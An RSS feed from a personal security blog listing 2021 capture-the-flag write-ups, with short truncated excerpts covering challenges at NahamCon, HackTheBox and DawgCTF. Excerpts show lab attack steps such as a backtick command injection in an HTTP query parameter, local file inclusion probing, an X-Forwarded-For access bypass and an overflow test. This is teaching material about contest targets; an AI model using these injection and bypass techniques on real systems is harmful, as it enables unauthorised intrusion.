<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>2021 on #!/bin/note</title><link>https://leonjza.github.io/categories/2021/</link><description>Recent content in 2021 on #!/bin/note</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://twitter.com/leonjza">@leonjza&lt;/a></copyright><lastBuildDate>Mon, 26 Jul 2021 20:19:36 +0200</lastBuildDate><atom:link href="https://leonjza.github.io/categories/2021/index.xml" rel="self" type="application/rss+xml"/><item><title>hackthebox business ctf 2021 writeups</title><link>https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/</link><pubDate>Mon, 26 Jul 2021 20:19:36 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/</guid><description>
&lt;img src="https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png"/>
&lt;p>The &lt;a href="https://www.hackthebox.eu/htb-business-ctf-2021">HackTheBox Business CTF 2021&lt;/a> ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost and we managed to score &lt;a href="https://ctf.hackthebox.eu/ctf/131/scoreboard">&lt;em>5th&lt;/em>&lt;/a> place amongst 374 other teams!&lt;/p>
&lt;figure class="left" >
&lt;img src="https://leonjza.github.io/images/htbbusiness21/htb_placement.png" />
&lt;/figure>
&lt;figure class="left" >
&lt;img src="https://leonjza.github.io/images/htbbusiness21/htb_graph.png" />
&lt;/figure>
&lt;p>The team was composed of (those with twitterz!): &lt;a href="https://twitter.com/felmoltor">felmoltor&lt;/a>, &lt;a href="https://twitter.com/JCoertze">JCoertze&lt;/a>, &lt;a href="https://twitter.com/TH3_GOAT_FARM3R">TH3_GOAT_FARM3R&lt;/a>, &lt;a href="https://twitter.com/Titanex8">Titanex8&lt;/a>, &lt;a href="https://twitter.com/_cablethief">_cablethief&lt;/a>, &lt;a href="https://twitter.com/gav1no_">gav1no_&lt;/a> and &lt;a href="https://twitter.com/GMILTE">GMILTE&lt;/a>.&lt;/p></description></item><item><title>DawgCTF 2021</title><link>https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/</link><pubDate>Sun, 09 May 2021 08:04:40 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/</guid><description>
foreword DawgCTF 20201 was the first CTF I played together with some local people much smarter than me over at Hack South. We managed to grab 28th place too.
I only solved three challenges with the time I had in the morning (of which one was a dupe because reading is hard :P).
solutions reversing - calculator Category: Reversing Points: 50 Files: Windows PE This was the duplicate challenge, but I&amp;rsquo;m writing up how I did it anyways.</description></item><item><title>hack the box - cyber apocalypse ctf '21</title><link>https://leonjza.github.io/blog/2021/04/24/hack-the-box-cyber-apocalypse-ctf-21/</link><pubDate>Sat, 24 Apr 2021 08:41:34 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/04/24/hack-the-box-cyber-apocalypse-ctf-21/</guid><description>
foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&amp;rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.
solutions category - web - BlitzProp Category: Web Difficulty: 1/4 Files: Web app source &amp;amp; build env The challenge landing page already had a hint in the &amp;ldquo;ASTa la vista baby&amp;rdquo; song.</description></item><item><title>NahamCon2021 CTF - IoT Itchy &amp; Scratchy SecureIoT Co</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-iot-itchy-scratchy-secureiot-co/</link><pubDate>Mon, 15 Mar 2021 18:22:05 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-iot-itchy-scratchy-secureiot-co/</guid><description>
category iot - hard
solution unfortunately the infra was down by the time I got to the writeup
We&amp;rsquo;re given an IP and credentials, along with a reference to mosquito. There was also a URL that accepted a username, a password and OTP.
I used MQTT Explorer to connect to the mosquito server. With a bit of patience, an office topic received a message with a &amp;ldquo;u&amp;rdquo; and &amp;ldquo;p&amp;rdquo; flag, base64 encoded.</description></item><item><title>NahamCon2021 CTF - Microscopium</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-microscopium/</link><pubDate>Mon, 15 Mar 2021 17:45:16 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-microscopium/</guid><description>
category mobile - medium
solution This was a fun one. We get an .apk to download. Open it in jadx and quickly see this is a React App.
package com.microscopium; import com.facebook.react.ReactActivity; public class MainActivity extends ReactActivity { /* access modifiers changed from: protected */ @Override // com.facebook.react.ReactActivity public String getMainComponentName() { return &amp;#34;Microscopium&amp;#34;; } } Being React, I expected a large chunk of the logic to be in a JavaScript file, which could be found in the resources section.</description></item><item><title>NahamCon2021 CTF - Resourceful</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-resourceful/</link><pubDate>Mon, 15 Mar 2021 17:29:32 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-resourceful/</guid><description>
category mobile - easy
solution We get an .apk to download. Open it in jadx. And check the com.congon4tor.resourceful.FlagActivity class. There is a reference to the string flag{ and resource called md5.
Checking out the resources section, the md5 is revealed to complete the flag.</description></item><item><title>NahamCon2021 CTF - Andra</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-andra/</link><pubDate>Mon, 15 Mar 2021 17:09:53 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-andra/</guid><description>
category mobile - easy
solution We get an .apk to download. Open it in jadx. And check the com.example.hack_the_app.MainActivity class.
Run the app in a simulator (or a phone whatever you want), enter the credentials and find the flag.</description></item><item><title>NahamCon2021 CTF - Ret2basic</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-ret2basic/</link><pubDate>Mon, 15 Mar 2021 16:39:53 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-ret2basic/</guid><description>
category binary exploitation - easy
solution The file we download is a ELF executable.
$ file ret2basic ret2basic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ca85eae693fed659275c0eed9c313e7f0083b85, for GNU/Linux 4.4.0, not stripped Running it hints the vuln.
$ ./ret2basic Can you overflow this?: AAAA Nope :( $ $ ./ret2basic Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [1] 9615 segmentation fault ./ret2basic $ Disassembling the binary, we find that main() eventually calls vuln where the overflow exists.</description></item><item><title>NahamCon2021 CTF - Asserted</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-asserted/</link><pubDate>Mon, 15 Mar 2021 11:52:39 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-asserted/</guid><description>
category web - medium
solution The challenge URL dropped us on a page related to fitness, with not a lot of interesting interactions.
Navigating the pages you&amp;rsquo;d see a URL scheme where a page parameter is set. Eg: page=about. An about.php also exists, so this was potentially vuln to LFI. Using .. in the page parameter resulted in a warning message indicating that some filtering was taking place.
$ curl &amp;#34;http://challenge.</description></item><item><title>NahamCon2021 CTF - AgentTester</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-agenttester/</link><pubDate>Mon, 15 Mar 2021 11:26:45 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-agenttester/</guid><description>
category web - medium
solution We&amp;rsquo;re given an archive to download, agenttester.zip. This contained a Dockerfile and a python web application. The files in the archive had many secrets redacted which were set using environment variables. One specifically interesting one was CHALLENGE_FLAG, which we could assume was the target value to leak.
The challenge URL dropped us on a page where we need to login. So, create an account, login and land on the home page of the agent tester.</description></item><item><title>NahamCon2021 CTF - Bad Blog</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-bad-blog/</link><pubDate>Mon, 15 Mar 2021 11:16:53 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-bad-blog/</guid><description>
category web - medium
solution The challenge URL drops us on a page where we need to login. So, create an account, login and land on the home page of a blog.
After creating a new post, you can see who visited your blog in the profile section.
Poking around will reveal that if you tamper with your user agent string, that is what will show up in the analytics section.</description></item><item><title>NahamCon2021 CTF - Cereal and Milk</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-cereal-and-milk/</link><pubDate>Mon, 15 Mar 2021 10:42:54 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-cereal-and-milk/</guid><description>
category web - medium
solution The challenge URL drops us on a page where we can submit cereals.
We are also given two files to download, index.php &amp;amp; log.php. I quickly spotted an unsafe deserialisation bug in the provided files. The cleaned up and relevant PHP code from both files were:
index.php
&amp;lt;?php include &amp;#39;log.php&amp;#39;; class CerealAndMilk { public $logs = &amp;#34;request-logs.txt&amp;#34;; public $request = &amp;#39;&amp;#39;; public $cereal = &amp;#39;Captain Crunch&amp;#39;; public $milk = &amp;#39;&amp;#39;; public function processed_data($output) { echo &amp;#34;Deserilized data:&amp;lt;br&amp;gt; Coming soon.</description></item><item><title>NahamCon2021 CTF - Imposter</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-imposter/</link><pubDate>Mon, 15 Mar 2021 10:16:35 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-imposter/</guid><description>
category web - medium
solution This was a tricker, but fun one. The challenge URL drops us on a login page with an OTP field.
Signing up for an account responsed with a JSON structure containing a url key with an otpauth URI.
Request
POST /signup HTTP/1.1 Host: challenge.nahamcon.com:30809 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://challenge.nahamcon.com:30809/signup Content-Type: application/json Origin: http://challenge.</description></item><item><title>NahamCon2021 CTF - Echo</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-echo/</link><pubDate>Mon, 15 Mar 2021 10:10:07 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-echo/</guid><description>
category warmups - easy
solution The challenge URL had a web based echo service.
Many special characters, except for &amp;lt; and ` were filtered. It took me a while but I found the param had command injection. For example:
GET /?echo=`id` HTTP/1.1 Host: challenge.nahamcon.com:30074 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://challenge.nahamcon.com:30074/?echo=food Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E Upgrade-Insecure-Requests: 1 Would respond with:</description></item><item><title>NahamCon2021 CTF - Homeward Bound</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-homeward-bound/</link><pubDate>Mon, 15 Mar 2021 10:04:11 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-homeward-bound/</guid><description>
category web - easy
solution The challenge URL returns the message Sorry, this page is not accessible externally.
Add the X-Forwarded-For: 127.0.0.1 header to reveal the flag.
GET / HTTP/1.1 Host: challenge.nahamcon.com:30903 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close X-Forwarded-For: 127.0.0.1 Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E Upgrade-Insecure-Requests: 1 The response has the flag.
&amp;lt;p class=&amp;#34;card-text&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;alert alert-success&amp;#34; role=&amp;#34;alert&amp;#34;&amp;gt; &amp;lt;b&amp;gt;Welcome!</description></item><item><title>NahamCon2021 CTF - Esab64</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-esab64/</link><pubDate>Mon, 15 Mar 2021 09:58:51 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-esab64/</guid><description>
category warmups - easy
solution The downloaded file contained a string, which looked like it was base64 encoded. The challenge title was also base64 reversed, esab64.
❯ cat esab64 mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X To solve, reverse the string, base64 decode and then reverse it again.
import base64 with open(&amp;#34;esab64&amp;#34;, &amp;#34;r&amp;#34;) as f: s = f.readline() s = s[::-1] d = base64.b64decode(s) print(d[::-1][:-1]) Running it gives us the flag.
$ python3 solve.py b&amp;#39;flag{fb5211b498afe87b1bd0db601117e16e}&amp;#39;</description></item><item><title>NahamCon2021 CTF - Pollex</title><link>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-pollex/</link><pubDate>Mon, 15 Mar 2021 09:52:23 +0200</pubDate><guid>https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-pollex/</guid><description>
category warmups - easy
solution The downloaded file you get is an image, when opened looks like this:
Output of exiftool shows that there is a thumbnail, with a hint to extract it right at the bottom.
❯ exiftool pollex.jpg ExifTool Version Number : 12.16 File Name : pollex.jpg Directory : . File Size : 37 KiB File Modification Date/Time : 2021:03:13 13:40:45+02:00 File Access Date/Time : 2021:03:15 09:53:11+02:00 File Inode Change Date/Time : 2021:03:15 09:53:11+02:00 File Permissions : rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.</description></item></channel></rss>